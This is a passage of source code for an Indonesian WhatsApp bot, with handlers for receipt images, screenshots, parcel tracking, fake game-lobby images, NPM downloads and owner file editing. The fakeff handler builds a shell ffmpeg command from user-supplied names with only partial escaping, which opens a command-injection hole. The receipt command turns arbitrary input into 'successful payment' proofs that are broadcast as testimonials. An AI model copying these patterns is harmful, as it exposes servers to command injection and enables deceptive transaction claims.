                // Validasi input minimal: nominal dan item
                if (args.length < 2) {
                    return reply(`*Format Salah!* Contoh: *${prefix + command} nominal|item*\n\n*Contoh Lengkap:*\n*${prefix + command} 50000|Topup ML|BERHASIL|QRIS|Vanness|12345*`);
                }

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    // Parsing data input
                    const nominal = Number(args[0].replace(/[^\d]/g, ""));
                    const item = args[1];
                    const status = args[2] || "BERHASIL";
                    const metode = args[3] || "QRIS";
                    const username = args[4] || m.pushName || "User";
                    const userId = args[5] || m.sender.split('@')[0];

                    if (!nominal || nominal < 100) return reply("Nominal tidak valid!");

                    // --- PROSES GENERATE STRUK (Canvas) ---
                    const canvas = createCanvas(500, 800);
                    const ctx = canvas.getContext('2d');

                    // Background & Header
                    ctx.fillStyle = "#ffffff";
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = "#111";
                    ctx.font = "bold 28px Arial";
                    ctx.textAlign = "center";
                    ctx.fillText("STRUK PEMBAYARAN", canvas.width / 2, 60);

                    // Garis Putus-putus
                    ctx.setLineDash([6, 8]);
                    ctx.strokeStyle = "#bdbdbd";
                    ctx.beginPath();
                    ctx.moveTo(40, 90);
                    ctx.lineTo(460, 90);
                    ctx.stroke();

                    // Menggambar Baris Data
                    ctx.textAlign = "left";
                    ctx.font = "20px Arial";
                    const startY = 140;
                    const lineSpacing = 45;

                    const drawRow = (label, value, y) => {
                        ctx.fillStyle = "#888";
                        ctx.fillText(label, 40, y);
                        ctx.fillStyle = "#111";
                        ctx.textAlign = "right";
                        ctx.fillText(value, 460, y);
                        ctx.textAlign = "left";
                    };

                    drawRow("Status", status, startY);
                    drawRow("Metode", metode, startY + lineSpacing);
                    drawRow("Item", item.length > 20 ? item.substring(0, 17) + "..." : item, startY + (lineSpacing * 2));
                    drawRow("Username", username, startY + (lineSpacing * 3));
                    drawRow("User ID", userId, startY + (lineSpacing * 4));

                    // Kotak Total
                    ctx.setLineDash([]);
                    ctx.strokeStyle = "#eee";
                    ctx.strokeRect(40, startY + (lineSpacing * 5), 420, 80);
                    ctx.font = "bold 24px Arial";
                    ctx.fillText("TOTAL", 60, startY + (lineSpacing * 5) + 48);
                    ctx.textAlign = "right";
                    ctx.fillText(`Rp ${nominal.toLocaleString('id-ID')}`, 440, startY + (lineSpacing * 5) + 48);

                    // Footer Waktu
                    ctx.textAlign = "center";
                    ctx.font = "italic 16px Arial";
                    ctx.fillStyle = "#999";
                    ctx.fillText("Terima kasih telah bertransaksi", canvas.width / 2, 700);
                    ctx.fillText(moment().tz("Asia/Jakarta").format('DD MMM YYYY, HH:mm:ss'), canvas.width / 2, 730);

                    const buffer = canvas.toBuffer('image/png');
                    const captionStruk = `✅ *Transaksi Berhasil*\n\n📦 *Item:* ${item}\n💰 *Total:* Rp ${nominal.toLocaleString('id-ID')}\n👤 *User:* ${username}\n\n_Struk ini dibuat otomatis oleh Vanness Bot_`;

                    // --- 1. KIRIM KE PENGIRIM (Private Chat) ---
                    await sock.sendMessage(m.chat, { image: buffer, caption: captionStruk }, { quoted: m });

                    // --- 2. KIRIM KE GRUP (Forward Otomatis) ---
                    // Ganti ID_GRUP_LU dengan ID asli (contoh: 12345678@g.us)
                    const targetGrup = "120363419091007808@g.us";
                    await sock.sendMessage(targetGrup, { image: buffer, caption: `📢 *NOTIFIKASI PEMBAYARAN*\nUser *${username}* baru saja membeli *${item}*!` });

                    // --- 3. KIRIM KE CHANNEL (Forward Otomatis) ---
                    // Ganti ID_CHANNEL_LU dengan ID asli (contoh: 12345678@newsletter)
                    const targetChannel = global.idCh || "120363335443641236@newsletter";
                    await sock.sendMessage(targetChannel, { image: buffer, caption: `✨ *Testimoni Baru*\nItem: ${item}\nStatus: ${status}` });

                    // --- 4. KIRIM KE STORY WA (Status) ---
                    await sock.sendMessage("status@broadcast", {
                        image: buffer,
                        caption: `Alhamdulillah, orderan ${item} mendarat mulus! 🔥`
                    }, { statusJidList: [m.sender] });

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {
                    console.error("Cetak Struk Error:", err);
                    reply("Gagal cetak struk: " + err.message);
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
            }
                break;


            case 'ssweb':
            case 'ssweb-3hasil':
            case 'screenshot': {
                const url = text?.trim();

                if (!url) {
                    return reply(
                        `📸 *sᴄʀᴇᴇɴsʜᴏᴛ ᴡᴇʙ 3 ᴠᴇʀsɪ*\n\n` +
                        `╭┈┈⬡「 📋 *ᴄᴀʀᴀ ᴘᴀᴋᴀɪ* 」\n` +
                        `┃ \`${prefix}ssweb <url>\`\n` +
                        `╰┈┈⬡\n\n` +
                        `> Contoh:\n` +
                        `\`${prefix}ssweb https://google.com\``
                    );
                }

                await sock.sendMessage(m.chat, { react: { text: '📸', key: m.key } });

                try {
                    const mediaList = await ssweb3(url);

                    await sock.sendMessage(m.chat, { react: { text: '📤', key: m.key } });

                    try {
                        const opener = generateWAMessageFromContent(
                            m.chat,
                            {
                                messageContextInfo: { messageSecret: randomBytes(32) },
                                albumMessage: {
                                    expectedImageCount: mediaList.length,
                                    expectedVideoCount: 0
                                }
                            },
                            {
                                userJid: sock.decodeJid(sock.user.id),
                                quoted: m,
                                upload: sock.waUploadToServer
                            }
                        );

                        await sock.relayMessage(opener.key.remoteJid, opener.message, {
                            messageId: opener.key.id
                        });

                        for (const content of mediaList) {
                            const msg = await generateWAMessage(opener.key.remoteJid, content, {
                                upload: sock.waUploadToServer
                            });

                            msg.message.messageContextInfo = {
                                messageSecret: randomBytes(32),
                                messageAssociation: {
                                    associationType: 1,
                                    parentMessageKey: opener.key
                                }
                            };

                            await sock.relayMessage(msg.key.remoteJid, msg.message, {
                                messageId: msg.key.id
                            });
                        }

                        await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                    } catch (albumErr) {
                        console.log('[SSWeb3] Album gagal, kirim satu-satu:', albumErr.message);

                        // Fallback: kirim satu per satu + forward ke channel
                        const saluranId = global.idCh || "120363335443641236@newsletter";
                        const saluranName = global.namaBot;

                        for (const content of mediaList) {
                            await sock.sendMessage(m.chat, {
                                image: content.image,
                                caption: content.caption,
                                contextInfo: {
                                    forwardingScore: 9999,
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: saluranId,
                                        newsletterName: saluranName,
                                        serverMessageId: 127
                                    }
                                }
                            }, { quoted: m });
                        }

                        await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                    }

                } catch (error) {
                    console.error('[SSWeb] Error:', error.message);
                    await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`❌ *ᴇʀʀᴏʀ*\n\n> ${error.message}`);
                }
                break;
            }


            case 'cekresi':
            case 'resi': {
                if (!text) return reply(`Contoh: ${prefix + command} SPXID061875822421`);

                const buttons = [
                    {
                        buttonId: `${prefix}getresi ${text}|shopee-express`,
                        buttonText: { displayText: '🛵 Shopee Express' },
                        type: 1
                    },
                    {
                        buttonId: `${prefix}getresi ${text}|jnt`,
                        buttonText: { displayText: '🚚 J&T Express' },
                        type: 1
                    },
                    {
                        buttonId: `${prefix}getresi ${text}|jne`,
                        buttonText: { displayText: '📦 JNE Express' },
                        type: 1
                    },
                    {
                        buttonId: `${prefix}getresi ${text}|sicepat`,
                        buttonText: { displayText: '⚡ SiCepat' },
                        type: 1
                    }
                ];

                await sock.sendMessage(m.chat, {
                    text: `📦 *CEK RESI TRACKING*\n\n` +
                        `Nomor Resi: *${text}*\n\n` +
                        `Silakan pilih ekspedisi di bawah ini:`,
                    footer: '@VannessWangsaff ID V3',
                    buttons: buttons,
                    headerType: 1,
                    contextInfo: {
                        externalAdReply: {
                            title: "Cek Resi Otomatis",
                            body: "Pilih kurir → tracking langsung",
                            thumbnailUrl: "https://img2.pixhost.to/images/7322/716841492_Vanness.jpg",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m });

                break;
            }

            case 'getresi': {
                if (!text) return;

                let [resi, kurir] = text.split('|');
                if (!resi || !kurir) return reply("Format salah!");

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    // Menggunakan API NexRay yang baru
                    const response = await axios.get(
                        `https://api.nexray.web.id/tools/cekresi?noresi=${resi}&ekspedisi=${kurir}`,
                        { timeout: 15000 }
                    );

                    const res = response.data;

                    // Validasi response dari API NexRay
                    if (!res.status || !res.result) {
                        return reply(`❌ Resi *${resi}* tidak ditemukan atau ekspedisi salah.\nCoba pastikan nomor resi dan pilihan kurirnya sudah benar.`);
                    }

                    const d = res.result;

                    // Parsing histori pengiriman agar aman jika array kosong atau format keys berbeda
                    let track = 'Belum ada riwayat pergerakan paket.';
                    if (d.history && d.history.length > 0) {
                        track = d.history.map(v => {
                            let tgl = v.tanggal || v.date || v.time || '-';
                            let ket = v.keterangan || v.desc || v.message || '-';
                            return `=> *${tgl}*\n┗ ${ket}`;
                        }).join('\n\n');
                    }

                    let caption = `✅ *PELACAKAN BERHASIL*\n\n`;
                    caption += `🎫 *No Resi:* ${d.resi || resi}\n`;
                    caption += `🚚 *Ekspedisi:* ${d.ekspedisi || kurir} (${d.ekspedisiCode || '-'})\n`;
                    caption += `🚦 *Status:* ${d.status || '-'}\n`;
                    caption += `📅 *Dikirim:* ${d.tanggalKirim || '-'}\n`;
                    caption += `📞 *CS/Layanan:* ${d.customerService || '-'}\n`;
                    caption += `📌 *Posisi Terakhir:* ${d.lastPosition || '-'}\n\n`;
                    caption += `📜 *HISTORI PENGIRIMAN:*\n\n${track}\n\n`;
                    caption += `> © @VannessWangsaff ID V3`;

                    await sock.sendMessage(m.chat, {
                        text: caption,
                        contextInfo: {
                            externalAdReply: {
                                title: `Resi ${d.resi || resi}`,
                                body: `${d.ekspedisi || kurir} • ${d.status || '-'}`,
                                thumbnailUrl: "https://files.catbox.moe/ohohwh.jpg",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (e) {

                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                    reply(`❌ Gagal melacak resi.\nServer API mungkin sedang sibuk atau down. Coba lagi nanti.`);
                }
                break;
            }

            case 'kodepos': {
                if (!text) return reply(`Masukkan nama daerah!\n\nContoh:\n${prefix + command} pekanbaru`);

                await sock.sendMessage(m.chat, { react: { text: '📮', key: m.key } });

                try {
                    const response = await axios.get(`https://api.siputzx.my.id/api/tools/kodepos?form=${encodeURIComponent(text)}`, {
                        timeout: 10000
                    });

                    const data = response.data;

                    if (!data.status || !data.data || data.data.length === 0) {
                        await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                        return reply(`❌ *Tidak ditemukan kode pos untuk:* ${text}\n\nCoba gunakan nama desa/kecamatan/kota yang lebih spesifik.`);
                    }

                    let caption = `📮 *PENCARIAN KODE POS BERHASIL*\n\n`;
                    caption += `🔍 *Pencarian:* ${text}\n`;
                    caption += `📊 *Ditemukan:* ${data.data.length} hasil\n\n`;
                    caption += `────────────────────\n\n`;

                    for (let i of data.data) {
                        caption += `📍 *Desa/Kelurahan:* ${i.desa}\n`;
                        caption += `🏘️ *Kecamatan:* ${i.kecamatan}\n`;
                        caption += `🏙️ *Kota/Kabupaten:* ${i.kota}\n`;
                        caption += `🌏 *Provinsi:* ${i.provinsi}\n`;
                        caption += `✉️ *Kode Pos:* \`${i.kodepos}\`\n`;
                        caption += `────────────────────\n\n`;
                    }

                    await sock.sendMessage(m.chat, { text: caption }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (e) {

                    await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`❌ Gagal mengambil data kode pos.\nMungkin API sedang bermasalah atau koneksi tidak stabil.`);
                }
                break;
            }

            case 'upset':
            case 'setvar':
            case 'updatesetting': {
                if (!isAn) return reply('❌ Khusus Owner!');

                const settingPath = './settings.js';

                if (!fs.existsSync(settingPath)) {
                    return reply(`❌ File *${settingPath}* tidak ditemukan!`);
                }

                try {
                    let data = fs.readFileSync(settingPath, 'utf8');

                    if (!text) {
                        let regex = /global\.(\w+)\s*=\s*(.*)/g;
                        let list = [];
                        let match;

                        while ((match = regex.exec(data)) !== null) {
                            let key = match[1];
                            let val = match[2].trim().replace(/,$/, '').replace(/^["']|["']$/g, '');
                            list.push(`• *${key}* : ${val}`);
                        }

                        if (list.length === 0) return reply('Tidak ada variable global yang ditemukan di setting.js');

                        let teks = `📋 *LIST GLOBAL VARIABLE*\n`;
                        teks += `📁 Lokasi: ${settingPath}\n\n`;
                        teks += list.join('\n') + '\n\n';
                        teks += `Cara mengubah:\n`;
                        teks += `${prefix}upset botname @VannessWangsaff V3\n`;
                        teks += `${prefix}upset ownerNumber 6281371379077`;

                        return reply(teks);
                    }

                    let [key, ...valueArr] = text.split(' ');
                    let val = valueArr.join(' ');

                    if (!key || !val) {
                        return reply(`Format salah!\n\nContoh:\n${prefix}upset botname @VannessWangsaff New`);
                    }

                    // Cek apakah variable sudah ada
                    let regex = new RegExp(`(global\\.${key}\\s*=\\s*)(["'\`])(.*?)(["'\`])`, 'g');

                    if (regex.test(data)) {
                        // Update variable yang sudah ada
                        let updatedData = data.replace(regex, `$1$2${val}$4`);
                        fs.writeFileSync(settingPath, updatedData, 'utf8');

                        // Update global langsung
                        global[key] = val;

                        reply(`✅ Berhasil mengubah\n*global.${key}* menjadi *${val}*`);
                    } else {
                        // Tambah variable baru di atas module.exports
                        let insertIndex = data.indexOf('module.exports');
                        if (insertIndex === -1) insertIndex = data.length;

                        let newData = data.slice(0, insertIndex) + `\nglobal.${key} = "${val}"\n` + data.slice(insertIndex);

                        fs.writeFileSync(settingPath, newData, 'utf8');
                        global[key] = val;

                        reply(`✅ Berhasil menambahkan variable baru\n*global.${key}* = "${val}"`);
                    }

                } catch (e) {
                    console.error(e);
                    reply(`❌ Gagal mengedit file setting.js\n${e.message}`);
                }
                break;
            }

            case 'addlist': {
                if (!m.isGroup) return m.reply(mess.group);
                if (!isAdmin && !isAn) return m.reply(mess.admin);

                let arg = text.split('|');
                if (!arg[0] || !arg[1]) return reply(`Gunakan format: ${prefix + command} kata kunci|respon\n\nContoh:\n*${prefix + command} spek|RAM 4GB,Storage 64GB*\n\n> Bisa sambil reply gambar untuk menambah gambar ke list`);

                let key = arg[0].trim();
                let response = arg[1].trim();

                if (isAlreadyResponList(m.chat, key, db_respon_list)) {
                    return reply(`❌ List dengan kata kunci *${key}* sudah ada di grup ini.`);
                }

                const isImage = /image/.test(mime);
                let imageUrl = '';

                if (isImage) {
                    await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                    let mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);

                    // Upload gambar 
                    imageUrl = await uploader.uguu(mediaPath);
                    fs.unlinkSync(mediaPath);
                }

                addResponList(m.chat, key, response, isImage, imageUrl, db_respon_list);
                reply(`✅ Berhasil menambahkan list baru!\n\n⌯⌲*Kata Kunci:* ${key}\n⌯⌲*Respon:* ${response}`);
                await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            }
                break;

            case 'updatelist':
            case 'editlist': {
                if (!m.isGroup) return m.reply(mess.group);
                if (!isAdmin && !isAn) return m.reply(mess.admin);

                let arg = text.split('|');
                if (!arg[0] || !arg[1]) return reply(`Gunakan format: ${prefix + command} kata kunci|respon baru\n\nContoh:\n*${prefix + command} spek|RAM 8GB,Storage 128GB*`);

                let key = arg[0].trim();
                let response = arg[1].trim();

                if (!isAlreadyResponList(m.chat, key, db_respon_list)) {
                    return reply(`❌ List dengan kata kunci *${key}* tidak ditemukan di grup ini!`);
                }

                const isImage = /image/.test(mime);
                let imageUrl = '';

                if (isImage) {
                    await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                    let mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
                    imageUrl = await uploader.uguu(mediaPath);
                    fs.unlinkSync(mediaPath);
                }

                updateResponList(m.chat, key, response, isImage, imageUrl, db_respon_list);
                reply(`✅ Berhasil memperbarui list!\n\n⌯⌲*Kata Kunci:* ${key}\n⌯⌲*Respon Baru:* ${response}`);
                await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            }
                break;

            case 'dellist':
            case 'hapuslist': {
                if (!m.isGroup) return m.reply(mess.group);
                if (!isAdmin && !isAn) return m.reply(mess.admin);

                if (!text) return reply(`Gunakan format: ${prefix + command} kata kunci\n\nContoh: ${prefix + command} spek`);

                let key = text.trim();

                if (!isAlreadyResponList(m.chat, key, db_respon_list)) {
                    return reply(`❌ List dengan kata kunci *${key}* tidak ditemukan di grup ini!`);
                }

                delResponList(m.chat, key, db_respon_list);
                reply(`✅ Berhasil menghapus list: *${key}*`);
            }
                break;

            case 'list':
            case 'listrespon':
            case 'liststore': {
                if (!m.isGroup) return m.reply(mess.group);

                if (!isAlreadyResponListGroup(m.chat, db_respon_list)) {
                    return reply("📭 Belum ada list respon yang tersimpan di grup ini.");
                }

                let arr = db_respon_list.filter(x => x.id === m.chat);
                if (arr.length === 0) return reply("📭 Belum ada list respon di grup ini.");

                let teks = `📋 *DAFTAR LIST GRUP INI*\n\n`;
                arr.forEach((res, index) => {
                    teks += `➜ ${index + 1}. ${res.key}\n`;
                });
                teks += `\n> Ketik salah satu kata kunci di atas untuk melihat responnya.`;

                reply(teks);
            }
                break;

            case 'afk': {
                const reason = text || 'Tidak ada alasan';
                setAfkUser(m.sender, reason);

                await sock.sendMessage(m.chat, {
                    text: `💤 *ᴀꜰᴋ ᴜsᴇʀ ᴀᴋᴛɪꜰ*\n\n\`\`\`@${m.sender.split('@')[0]} sekarang AFK\`\`\`\n⌯⌲ \`Alasan:\` *${reason}*\n\n>Ketik apapun untuk menonaktifkan AFK.`,
                    mentions: [m.sender]
                }, { quoted: m });
            }
                break;

            case 'fakeff':
            case 'lobyff':
            case 'lobbyff': {
                const args_ff = text.split('|')
                if (args_ff.length < 2) return reply(`Format Salah!\nContoh: ${prefix + command} 1|@VannessWangsaff\nAtau: ${prefix + command} random|@VannessWangsaff\n\nPilihan Template: 1 - 22 atau ketik random`)

                let numStr = args_ff[0].trim().toLowerCase()
                const name = args_ff[1].trim()

                const imageUrls = {
                    1: 'https://cloud-fukushima.vercel.app/uploader/8fjhd6ftps.jpg',
                    2: 'https://cloud-fukushima.vercel.app/uploader/oz8hb4ow75.jpg',
                    3: 'https://cloud-fukushima.vercel.app/uploader/tvz1cie8df.jpg',
                    4: 'https://cloud-fukushima.vercel.app/uploader/yo9sg4vmo3.jpg',
                    5: 'https://i.ibb.co/twtSvQXv/image.jpg',
                    6: 'https://i.ibb.co/n80Bc1wV/image.jpg',
                    7: 'https://i.ibb.co/mCwmt019/image.jpg',
                    8: 'https://i.ibb.co/JwG60TwF/image.jpg',
                    9: 'https://i.ibb.co/zWNLw6bV/image.jpg',
                    10: 'https://i.ibb.co/d4DvnHw6/image.jpg',
                    11: 'https://i.ibb.co/hxMGbx9v/image.jpg',
                    12: 'https://i.ibb.co/jvd5xfvK/image.jpg',
                    13: 'https://i.ibb.co/KxTQ0r0x/image.jpg',
                    14: 'https://i.ibb.co/rRyxvrJW/image.jpg',
                    15: 'https://i.ibb.co/PG5jwG6S/image.jpg',
                    16: 'https://i.ibb.co/MDdH7kjG/image.jpg',
                    17: 'https://i.ibb.co/6cnHvL31/image.jpg',
                    18: 'https://i.ibb.co/dwg4CGdf/image.jpg',
                    19: 'https://i.ibb.co/pvx1PZyW/image.jpg',
                    20: 'https://i.ibb.co/kVkbxhwg/image.jpg',
                    21: 'https://i.ibb.co/rK8ZTPbt/image.jpg',
                    22: 'https://i.ibb.co/vC3p8NjP/image.jpg'
                }

                const maxNum = Object.keys(imageUrls).length
                let num = 1

                if (numStr === 'random') {
                    num = Math.floor(Math.random() * maxNum) + 1
                } else {
                    num = parseInt(numStr)
                    if (isNaN(num) || num > maxNum || num < 1) return reply(`❌ Template tidak ditemukan! Silakan pilih nomor 1 sampai ${maxNum} atau ketik random.`)
                }

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

                try {
                    const imageUrl = imageUrls[num]
                    let ext = imageUrl.endsWith('.png') ? '.png' : '.jpg'

                    // Simpan file sementara di folder trash yang sudah ada di script kamu
                    const trashDir = path.join(process.cwd(), 'data', 'trash')
                    if (!fs.existsSync(trashDir)) fs.mkdirSync(trashDir, { recursive: true })

                    const tempImagePath = path.join(trashDir, `temp_lobby_${Date.now()}${ext}`)
                    const outputPath = path.join(trashDir, `temp_ff_${Date.now()}${ext}`)

                    // Path absolut ke font agar FFMPEG tidak kebingungan
                    const fontPath = path.resolve(process.cwd(), 'lib/AGENCYB.TTF')

                    if (!fs.existsSync(fontPath)) return reply('❌ File Font (AGENCYB.TTF) tidak ditemukan di folder lib!')

                    // Menggunakan axios sesuai standar di Vanness.js
                    const response = await axios.get(imageUrl, {
                        responseType: 'arraybuffer',
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                        }
                    })

                    const buffer = Buffer.from(response.data)
                    fs.writeFileSync(tempImagePath, buffer)

                    let fontSize
                    if (name.length <= 6) fontSize = 'w*0.055'
                    else if (name.length <= 10) fontSize = 'w*0.045'
                    else if (name.length <= 15) fontSize = 'w*0.038'
                    else fontSize = 'w*0.030'

                    // Perbaikan format string agar FFmpeg berjalan dengan baik di Windows/Linux
                    const safeName = name.replace(/'/g, "\\'")
                    const safeFontPath = fontPath.replace(/\\/g, '/')

                    const ffCmd = `ffmpeg -i "${tempImagePath}" -vf drawtext="fontfile='${safeFontPath}':text='${safeName}':x=((w-text_w)/2)+(w*0.02):y=h*0.80-(text_h/2):fontsize=${fontSize}:fontcolor=yellow:shadowcolor=black:shadowx=3:shadowy=3" "${outputPath}"`

                    exec(ffCmd, async (err) => {
                        if (err) {
                            console.error(err)
                            if (fs.existsSync(tempImagePath)) fs.unlinkSync(tempImagePath)
                            await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
                            return reply('❌ Gagal memproses gambar. Pastikan FFMPEG sudah terinstal di server atau komputer kamu.')
                        }

                        let captionText = `> ✅ *FF LOBBY CUSTOM*\n> 👤 Name: ${name.toUpperCase()}\n> 🖼️ Template: No. ${num}`

                        await sock.sendMessage(m.chat, {
                            image: fs.readFileSync(outputPath),
                            caption: captionText
                        }, { quoted: m })

                        await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

                        // Menghapus file sampah setelah berhasil dikirim
                        if (fs.existsSync(tempImagePath)) fs.unlinkSync(tempImagePath)
                        if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath)
                    })

                } catch (e) {
                    console.error(e)
                    reply('❌ Terjadi kesalahan pada server saat mengunduh gambar.')
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
                }
            }
                break

            case 'npmdl':
            case 'npm': {
                if (!text) return reply(`Masukkan nama package NPM yang mau didownload!\nContoh: ${prefix + command} agus buntung`);

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    let pkgName = text.trim().toLowerCase();
                    let { data } = await axios.get(`https://registry.npmjs.org/${pkgName}`);

                    let latestVersion = data['dist-tags'].latest;
                    let info = data.versions[latestVersion];
                    let tarballUrl = info.dist.tarball;

                    let txt = `╭──〔 *NPM DOWNLOADER* 〕─╮\n`;
                    txt += `│\n`;
                    txt += `│ 📦 *Package* : ${info.name}\n`;
                    txt += `│ 🏷️ *Version* : ${latestVersion}\n`;
                    txt += `│ ⚖️ *License* : ${info.license || 'Unknown'}\n`;
                    txt += `│ 👤 *Author* : ${info.author?.name || 'Unknown'}\n`;
                    txt += `│\n`;
                    txt += `│ 📝 *Desc* : ${info.description || 'No description'}\n`;
                    txt += `╰────────────────────╯\n\n`;
                    txt += `> ⏳ _Mengunduh file, mohon tunggu sebentar..._`;

                    await reply(txt);

                    await sock.sendMessage(m.chat, {
                        document: { url: tarballUrl },
                        fileName: `${info.name}_v${latestVersion}.tgz`,
                        mimetype: 'application/gzip',
                        caption: `✅ *Package ${info.name} berhasil diunduh!*\n> © @VannessWangsaff ID`
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (e) {
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                    if (e.response && e.response.status === 404) {
                        reply(`❌ Package NPM dengan nama *"${text}"* tidak ditemukan. Pastikan ejaan namanya benar!`);
                    } else {
                        console.error(e);
                        reply(`❌ Terjadi kesalahan dari server saat mencoba mengunduh package tersebut.`);
                    }
                }
            }
                break;

            case 'fakeml':
            case 'mlbbfake':
            case 'mlcard':
            case 'mlfake': {
                if (!text) {
                    return reply(
                        `🎮 *ML FAKE LOBBY*\n\n` +
                        `Masukkan nickname untuk profile ML kamu!\n` +
                        `*Cara Penggunaan:*\n` +
                        `> 1. Kirim foto + caption \`${prefix + command} <nama>\`\n` +
                        `> 2. Reply foto dengan \`${prefix + command} <nama>\`\n\n` +
                        `> Catatan: Jika tidak mengirim foto, bot otomatis menggunakan foto profil WhatsApp kamu._`
                    );
                }

                const name = text.trim();
                const isImage = /image/.test(mime);

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                let imageUrl = "";
                let mediaPath = null;

                try {
                    if (isImage) {
                        // Jika user mengirim/reply gambar, download dan upload ke Uguu
                        mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
                        imageUrl = await uploader.uguu(mediaPath);
                        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
                    } else {
                        // Jika tidak ada gambar, fallback ke foto profil user
                        try {
                            imageUrl = await sock.profilePictureUrl(m.sender, "image");
                        } catch {
                            // Fallback terakhir jika user tidak ada PP / disembunyikan
                            imageUrl = "https://files.catbox.moe/cp29pc.jpg";
                        }
                    }

                    // Memanggil API Nexray untuk generate gambar
                    const apiUrl = `https://api.nexray.web.id/maker/fakelobyml?avatar=${encodeURIComponent(imageUrl)}&nickname=${encodeURIComponent(name)}`;

                    let captionText = `╭──〔 *ML FAKE LOBBY* 〕─╮\n`;
                    captionText += `│\n`;
                    captionText += `│ 👤 *Nickname* : ${name}\n`;
                    captionText += `│ 🎮 *Game* : Mobile Legends\n`;
                    captionText += `│ ✨ *Status* : Sukses generate fake ml!\n`;

                    captionText += `╰────────────────────╯\n`;
                    captionText += `> © @VannessWangsaff ID V3`;

                    await sock.sendMessage(m.chat, {
                        image: { url: apiUrl },
                        caption: captionText
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (error) {
                    console.error("Erorr", error);

                    // Bersihkan file sementara jika error terjadi di pertengahan
                    if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);

                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                    reply(`❌ Gagal membuat Fake ML.\nMungkin server API sedang sibuk atau gambar yang kamu kirim tidak didukung.`);
                }
            }
                break;

            case 'addfile':
            case 'savefile': {
                if (!isAn) return reply('❌ Fitur ini khusus Owner!');

                if (!text) {
                    return reply(
                        `*SYSTEM FILE MANAGER*\n\n` +
                        `Masukkan nama file atau path-nya!\n` +
                        `*Contoh Penggunaan:*\n` +
                        `1. Reply teks/kode dengan caption: \`${prefix + command} namafile.js\`\n` +
                        `2. Reply dokumen/file dengan caption: \`${prefix + command} namafile.js\`\n\n` +
                        `*Contoh Path:* \`lib/fiturbaru.js\``
                    );
                }

                let pathInput = text.trim();

                // Proteksi Path Traversal untuk keamanan
                if (pathInput.includes('..')) {
                    await sock.sendMessage(m.chat, { react: { text: "⚠️", key: m.key } });
                    return reply('❌ Akses Ditolak! Dilarang menggunakan ".." (Path Traversal)!');
                }

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    const targetPath = path.resolve(process.cwd(), pathInput);
                    const dirName = path.dirname(targetPath);

                    // Buat folder secara otomatis jika belum ada
                    if (!fs.existsSync(dirName)) {
                        fs.mkdirSync(dirName, { recursive: true });
                    }

                    let q = m.quoted ? m.quoted : m;
                    let mime = (q.msg || q).mimetype || '';
                    let isSaved = false;

                    if (mime) {
                        // Jika me-reply media / dokumen
                        let mediaPath = await sock.downloadAndSaveMediaMessage(q);
                        if (mediaPath) {
                            fs.copyFileSync(mediaPath, targetPath);
                            fs.unlinkSync(mediaPath); // Hapus file temporary
                            isSaved = true;
                        }
                    } else if (m.quoted && m.quoted.text) {
                        // Jika me-reply teks / kode
                        fs.writeFileSync(targetPath, m.quoted.text);
                        isSaved = true;
                    }

                    if (isSaved) {
                        let stat = fs.statSync(targetPath);

                        let captionText = `╭──〔 *SYSTEM FILE INJECTOR* 〕──╮\n`;

                        captionText += `│ 📂 *Target* : ${pathInput}\n`;
                        captionText += `│ 📊 *Size* : ${(stat.size / 1024).toFixed(2)} KB\n`;
                        captionText += `│ ⚡ *Status* : Sukses menambahkan file ke sistem!\n`;

                        captionText += `╰─────────────────────╯\n`;
                        captionText += `> © @VannessWangsaff ID V3`;

                        await sock.sendMessage(m.chat, { text: captionText }, { quoted: m });
                        await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
                    } else {
                        await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                        reply('❌ Gagal menyimpan! Pastikan kamu me-reply teks/kode atau dokumen media yang ingin disimpan.');
                    }

                } catch (e) {
                    console.error("[ADDFILE ERROR]", e);
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
